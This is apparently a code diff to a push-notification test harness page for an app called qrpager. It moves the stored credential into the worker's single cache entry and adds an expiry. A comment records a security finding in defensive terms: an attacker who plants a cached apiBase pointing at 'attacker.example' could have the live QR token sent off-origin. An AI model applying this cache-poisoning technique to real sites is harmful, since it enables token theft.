@@ -56,8 +56,26 @@ const API_BASE = process.env.NEXT_PUBLIC_QRPAGER_API_BASE ?? ''
 const VAPID_PUBLIC_KEY = process.env.NEXT_PUBLIC_VAPID_PUBLIC_KEY ?? ''
 
 const TOKEN_KEY = 'qrpager.harness.token'
-const CACHE_NAME = 'qrpager-harness'
-const CACHE_KEY = '/harness-token'
+
+/**
+ * ⚠ THE PRODUCTION CREDENTIAL CACHE, NOT A HARNESS ONE OF ITS OWN, AND THAT IS A SECURITY
+ * CHANGE RATHER THAN TIDYING. `§11` round one, SEC M-3, ruled HIGH by Muhammad on 2026-11-01.
+ *
+ * This page used to write `qrpager-harness` / `/harness-token`, and `sw.js` read it as a
+ * SECOND credential source. That made the shipped worker reachable by anything that could
+ * write a cache on this origin: plant `{token, apiBase: 'https://attacker.example'}` and the
+ * next rotation POSTed the live QR token off-origin -- and the worker wrote `apiBase` back, so
+ * the exfiltration survived removal of the script that planted it. `§4 › Data` says the raw
+ * token never leaves.
+ *
+ * The ruling is that the production worker must not be able to read the harness credential
+ * **at all -- not validate it, not reach it**. So the harness writes the one entry the worker
+ * already owns, and `sw.js` has exactly one credential source again. `qrpager-harness` is no
+ * longer in the worker's `OWNED` list either, which means `activate` now DELETES it from any
+ * device that ever ran the older harness.
+ */
+const CACHE_NAME = 'qrpager-pager-credential'
+const CACHE_KEY = '/pager-credential'
 
 /**
  * base64url → bytes, for `applicationServerKey`.
@@ -219,7 +237,14 @@ export default function PushHarnessPage() {
         await cache.put(
           CACHE_KEY,
           new Response(
-            JSON.stringify({ token, applicationServerKey: VAPID_PUBLIC_KEY, apiBase: API_BASE }),
+            JSON.stringify({
+              token,
+              applicationServerKey: VAPID_PUBLIC_KEY,
+              apiBase: API_BASE,
+              // `sw.js` treats an ABSENT expiry as expired (SEC M-2), so the harness supplies
+              // one. Two hours is the TTL of the pager session this token belongs to.
+              expiresAt: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString(),
+            }),
             { headers: { 'Content-Type': 'application/json' } },
           ),
         )
